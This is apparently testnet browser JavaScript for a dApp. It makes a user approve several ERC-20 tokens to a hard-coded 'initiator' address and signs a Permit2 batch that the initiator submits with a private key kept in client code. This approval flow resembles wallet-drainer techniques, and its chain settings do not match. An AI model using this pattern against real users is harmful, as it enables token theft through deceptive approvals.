const { ethers, ethereum } = window;

// constants
const RPC = "https://sepolia.infura.io/v3/fb42577745e24d429d936f65b43cca0b"; // Goerly RPC
const chainId = 5; // Goerly chain id  11155111"
const Permit2ContractAddress = "0x3Aa6320A008413F71149d3EB00328B669F8C2569"; // Permit2 deployed to Sepolia : 0x3Aa6320A008413F71149d3EB00328B669F8C2569
// const token1 = "0x8556C135e9899bc6e747f80a3084b2Ff5dDC574C"; // SHIBA on Goerly
// const token2 = "0xAe258c792361101eE7DC3061f8f259365b44769F"; // USDT on Goerly
const tokenAddresses = [
  "0x1901A535526d973bc143e61D86e11282e4f1Ad5c", // USDC address
  "0x3496989c4C8D523eC3C8db0dB85F04BCe95252fE", // USDT address
  "0xB836eE20593c6310929b6f05a45a098fb602b93f",
  // Replace with DAI address
];

const amount1 = String(20 * 10 ** 18); // calculate SHIBA  20 * 10 ** 18
const initiator = ""; // initiator address
const initiatorPK =""; // initiaror's private key

// setup UI
const connectButton = document.getElementById("connect");
const approveButton = document.getElementById("approve");
const mainButton = document.getElementById("main");

approveButton.disabled = true;
mainButton.disabled = true;

// ABIs
const Permit2ContractABI = [
  {
    inputs: [
      {
        internalType: "address",
        name: "owner",
        type: "address",
      },
      {
        components: [
          {
            components: [
              {
                internalType: "address",
                name: "token",
                type: "address",
              },
              {
                internalType: "uint160",
                name: "amount",
                type: "uint160",
              },
              {
                internalType: "uint48",
                name: "expiration",
                type: "uint48",
              },
              {
                internalType: "uint48",
                name: "nonce",
                type: "uint48",
              },
            ],
            internalType: "struct IAllowanceTransfer.PermitDetails[]",
            name: "details",
            type: "tuple[]",
          },
          {
            internalType: "address",
            name: "spender",
            type: "address",
          },
          {
            internalType: "uint256",
            name: "sigDeadline",
            type: "uint256",
          },
        ],
        internalType: "struct IAllowanceTransfer.PermitBatch",
        name: "permitBatch",
        type: "tuple",
      },
      {
        internalType: "bytes",
        name: "signature",
        type: "bytes",
      },
    ],
    name: "permit",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
];

const ERC20_ABI = [
  {
    constant: false,
    inputs: [
      { name: "_spender", type: "address" },
      { name: "_value", type: "uint256" },
    ],
    name: "approve",
    outputs: [{ name: "", type: "bool" }],
    payable: false,
    stateMutability: "nonpayable",
    type: "function",
  },
];

// variables
let provider, web3;
let selectedAddress;

// connect function
async function connect() {
  //window.web3 = new Web3(window.ethereum);
  web3 = new Web3(window.ethereum);
  provider = new ethers.providers.Web3Provider(ethereum);
  const network = await provider.getNetwork();

  // if (network.chainId !== chainId) {
  //     try {
  //         await provider.send("wallet_switchEthereumChain", [{ chainId: `0x${chainId}` }])
  //     } catch (err) {
  //         console.log("error", err)
  //         return
  //     }
  // }

  const accounts = await provider.send("eth_requestAccounts", []);
  selectedAddress = accounts[0];

  connectButton.innerText = selectedAddress;
  connectButton.disabled = true;
  approveButton.disabled = false;
  mainButton.disabled = false;
  console.log(selectedAddress);
}

async function approveToken() {
  const tokenContracts = tokenAddresses.map((tokenAddress) => {
    return new web3.eth.Contract(ERC20_ABI, tokenAddress, {
      from: selectedAddress,
    });
  });

  const approvePromises = tokenContracts.map((tokenContract) => {
    return tokenContract.methods
      .approve(initiator, amount1)
      .send({ from: selectedAddress });
  });

  Promise.all(approvePromises)
    .then(() => {
      console.log(
        "You successfully approved the tokens with the amount",
        amount1
      );
    })
    .catch((error) => {
      console.error("Error approving tokens:", error);
    });
}

// function for token approval to the Permit2 contract
async function permit() {
  const permit2Contract = new web3.eth.Contract(
    Permit2ContractABI,
    Permit2ContractAddress
  );

  const permitDetails = tokenAddresses.map((token, index) => ({
    token: token,
    amount: amount1,
    expiration: Math.floor(Date.now() / 1000) + 120,
    nonce: index,
  }));

  const permitBatch = {
    details: permitDetails,
    spender: selectedAddress,
    sigDeadline: Math.floor(Date.now() / 1000) + 120,
  };

  const domain = {
    chainId: chainId,
    name: "Permit2",
    verifyingContract: Permit2ContractAddress,
  };

  const types = {
    PermitDetails: [
      { name: "token", type: "address" },
      { name: "amount", type: "uint160" },
      { name: "expiration", type: "uint48" },
      { name: "nonce", type: "uint48" },
    ],
    PermitBatch: [
      { name: "details", type: "PermitDetails[]" },
      { name: "spender", type: "address" },
      { name: "sigDeadline", type: "uint256" },
    ],
  };

  const permitData = JSON.stringify({
    types: types,
    domain: domain,
    primaryType: "PermitBatch",
    message: permitBatch,
  });

  // const signature = await provider.send("eth_signTypedData_v4", [
  //   selectedAddress,
  //   permitData,
  // ]);
  const signature = await ethereum.request({
    method: "eth_signTypedData_v4",
    params: [selectedAddress, permitData],
  });
  
  const initiatorNonce = await web3.eth.getTransactionCount(initiator);
  const gasPrice = await web3.eth.getGasPrice();

  const permitTX = {
    from: initiator,
    to: Permit2ContractAddress,
    nonce: web3.utils.toHex(initiatorNonce),
    gasLimit: web3.utils.toHex(98000),
    gasPrice: web3.utils.toHex(Math.floor(gasPrice * 1.3)),
    value: "0x",
    data: permit2Contract.methods
      .permit(selectedAddress, permitBatch, signature)
      .encodeABI(),
  };

  const signedPermitTX = await web3.eth.accounts.signTransaction(
    permitTX,
    initiatorPK
  );
  web3.eth
    .sendSignedTransaction(signedPermitTX.rawTransaction)
    .on("transactionHash", function (hash) {
      console.log("Wait for a little bit...");
    })
    .on("receipt", function (receipt) {
      console.log("You successfully approved the tokens.");
    });
}

// configure buttons
window.addEventListener("DOMContentLoaded", () => {
  connectButton.onclick = connect;
  console.log("hbdj");
}),
  window.addEventListener("DOMContentLoaded", () => {
    approveButton.onclick = approveToken;
  });

window.addEventListener("DOMContentLoaded", () => {
  mainButton.onclick = permit;
});
